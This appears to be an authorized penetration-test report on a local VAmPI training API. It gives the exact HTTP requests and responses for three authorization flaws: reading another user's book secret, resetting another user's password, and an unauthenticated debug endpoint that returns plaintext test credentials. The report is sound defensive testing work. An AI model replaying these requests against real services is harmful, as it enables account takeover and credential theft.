# Assessment report

Target: `http://127.0.0.1:43939` (authorized disposable loopback VAmPI instance)
Scope exercised: `/users/v1`, `/users/v1/login`, `/me`, `/users/v1/{username}/email`,
`/users/v1/{username}/password`, `/users/v1/_debug`, `/books/v1`, `/books/v1/{title}`.
No other host/port was contacted, no account was registered, and every mutation was reverted
to the pre-test state on the disposable instance.

---

## Finding 1 — Broken object-level authorization: read another user's book (`books`, `read`)

**Rule violated.** `engagement.json` states books are readable by "the account that created the book";
the per-object read (`GET /books/v1/{title}`) must only succeed for the owner.

**Subjects.**
- Acting account: `alice` (stable subject `alice`, JWT `sub` = `alice`).
- Owning account: `bob` (stable subject `bob`, JWT `sub` = `bob`).

**Exact request.**
```
GET /books/v1/bob-book-m043 HTTP/1.1
Host: 127.0.0.1:43939
Authorization: Bearer <alice auth_token>
```

**Response.**
```
HTTP/1.1 200 OK
Content-Type: application/json

{"book_title": "bob-book-m043", "owner": "bob", "secret": "bob-secret-m043"}
```

**Identification of object and value.** The book was created by `bob` in this session with
`POST /books/v1` and body `{"book_title":"bob-book-m043","secret":"bob-secret-m043"}` (HTTP 200,
`{"message": "Book has been added.", "status": "success"}`). The title `bob-book-m043` is a
unique, session-generated identifier; the returned `owner` field is `bob`, and the returned
`secret` (`bob-secret-m043`) is a unique value that only `bob` supplied and that is not exposed
by the collection listing. Alice's response is byte-identical to Bob's own owner read.

**Baselines and controls.**
- Owner baseline: `GET /books/v1/bob-book-m043` with Bob's token → 200 with the same body
  (`{"book_title": "bob-book-m043", "owner": "bob", "secret": "bob-secret-m043"}`).
- Unauthenticated control: same request without a token → **401**.
- Absence control: `GET /books/v1/no-such-book-m043` with a valid token → **404**
  (`{ "status": "fail", "message": "Book not found!"}`), showing the 200 above is a real
  object hit, not a generic response.
- Cross-direction control: Bob's token reading `alice-book-m043` → 200 with
  `{"book_title": "alice-book-m043", "owner": "alice", "secret": "alice-secret-m043"}`.
- The full 3×3 matrix (alice/bob/carol as readers × alice/bob/carol as owners) returned 200
  with the owner's `secret` for every non-owner pair.

**Qualifications.** The collection listing (`GET /books/v1`) explicitly exposes titles and
owners to anyone, so titles are discoverable; the finding is the disclosure of the per-book
`secret` field, which the listing does not contain. No delete operation exists for books.

---

## Finding 2 — Broken object-level authorization: overwrite another user's password (`user_password`, `update`)

**Rule violated.** `engagement.json` states `user_password` (`PUT /users/v1/{username}/password`)
is writable by "the named account only".

**Subjects.**
- Acting account: `bob` (stable subject `bob`).
- Owning/target account: `carol` (stable subject `carol`).

**Exact request.**
```
PUT /users/v1/carol/password HTTP/1.1
Host: 127.0.0.1:43939
Authorization: Bearer <bob auth_token>
Content-Type: application/json

{"password":"cross-set-carol-m043-pw"}
```

**Response.**
```
HTTP/1.1 204 NO CONTENT
```

**Identification of object and value.** The target account is named explicitly in the path
(`carol`) and the new credential is a unique marker value `cross-set-carol-m043-pw`. Effect was
confirmed against authentication state, not the status code alone:
- `POST /users/v1/login {"username":"carol","password":"carol-smoke-pw"}` →
  `{ "status": "fail", "message": "Password is not correct for the given username." }`
- `POST /users/v1/login {"username":"carol","password":"cross-set-carol-m043-pw"}` →
  `{"auth_token": "...", "message": "Successfully logged in ..."}`
  (JWT payload decoded: `{"sub":"carol","iat":...,"exp":...}`)

**Baselines and controls.**
- Self baseline: `carol` changing her own password with Carol's token → 204 and Carol can log in
  with the new value.
- Acting-account isolation control: after Bob's cross-user PUT, Bob's own credentials still
  authenticate (`bob` / `bob-smoke-pw` → token) and Bob does **not** accept
  `cross-set-carol-m043-pw` (login → password failure), proving the write landed on `carol`,
  not on the acting account.
- Unauthenticated control: `PUT /users/v1/carol/password` with no token → **401**.

**Qualifications / cleanup.** Carol's password was restored to `carol-smoke-pw` with Carol's
token (204) and re-verified by a successful login. The old pre-rotation Carol bearer token
remained valid during the window because sessions are stateless JWTs, so the restore was
possible without the new secret.

---

## Finding 3 — Broken function-level authorization: unauthenticated credential dump (`user_debug`, `read`)

**Rule violated.** `engagement.json` states `/users/v1/_debug` is readable by "nobody; the
application documents this object as a developer debug object that returns account records".

**Subjects.**
- Acting account: unauthenticated visitor (no session, no `Authorization` header).
- Owning subjects: all accounts (`name1`, `name2`, `admin`, `alice`, `bob`, `carol`).

**Exact request.**
```
GET /users/v1/_debug HTTP/1.1
Host: 127.0.0.1:43939
```

**Response.**
```
HTTP/1.1 200 OK
Content-Type: application/json

{"users":[
 {"admin":false,"email":"mail1@mail.com","password":"pass1","username":"name1"},
 {"admin":false,"email":"mail2@mail.com","password":"pass2","username":"name2"},
 {"admin":true,"email":"admin@mail.com","password":"pass1","username":"admin"},
 {"admin":false,"email":"alice@example.test","password":"alice-smoke-pw","username":"alice"},
 {"admin":false,"email":"bob@example.test","password":"bob-smoke-pw","username":"bob"},
 {"admin":false,"email":"carol@example.test","password":"carol-smoke-pw","username":"carol"}]}
```

**Identification of object and value.** The response identifies each account by `username`
and returns its `email`, plaintext `password`, and `admin` flag. The values match the
engagement-supplied credentials and the admin flag matches `admin`'s declared role, tying the
records to real accounts. The endpoint is the declared `user_debug` resource.

**Baselines and controls.**
- Unauthenticated access returns 200, establishing the missing authorization check.
- Compare the public `GET /users/v1`, which deliberately exposes only `username`/`email`
  (no passwords, no admin flag) — the delta isolates the leaked `password` and `admin` fields.
- Control on session enforcement elsewhere: `GET /me` with a bogus bearer token → **401**,
  showing the service does enforce sessions on protected routes, so this exposure is
  route-specific and not a global auth outage.
- `GET /users/v1/_debug` was also reachable with a valid token; the finding is the
  unauthenticated reachability.

**Qualifications.** This overlaps the disclosed `users` listing only in `username`/`email`;
the password and admin fields are unique to the debug object and are not declared readable by
anyone. No account state was modified through this endpoint.

---

## Explicitly tested and NOT supported as findings

- **`user_email`, `update` — cross-user.** `PUT /users/v1/alice/email` with Bob's token returned
  **204** but changed **Bob's** email, not Alice's. Alice's email remained
  `alice@example.test` throughout. The path `{username}` is ignored for the email endpoint, so
  there is no cross-user write effect; the misleading 204 is a response-semantics issue, not an
  authorization bypass. (Bob's email was restored and verified.)
- **`users`, `read`.** `GET /users/v1` (with and without a token) returns 200 with
  `username`/`email`, which matches the declared rule ("readers: anyone, including a visitor
  without a session").
- **`books`, collection listing.** `GET /books/v1` returns titles and owners to an
  unauthenticated visitor, matching the declared rule.
- **`books`, `read` without a session.** `GET /books/v1/bob-book-m043` with no token → 401
  (control), consistent with the declared authentication rule.

## Scope exercised

Identities used: `name1`, `name2`, `admin`, `alice`, `bob`, `carol` (login via
`POST /users/v1/login`, identity confirmed via `GET /me` → `data.username`).
Operations exercised: book create and read (3×3 cross-reader/owner matrix), user collection
read, own and cross-user `email` update, own and cross-user `password` update, and
`/users/v1/_debug` read unauthenticated and authenticated. Controls: no-token requests
(401), bogus token (401), unknown book (404). Administrative account removal, account
registration, and any host/port outside `127.0.0.1:43939` were not exercised and are not
assessed here. All test mutations were restored on the disposable instance.
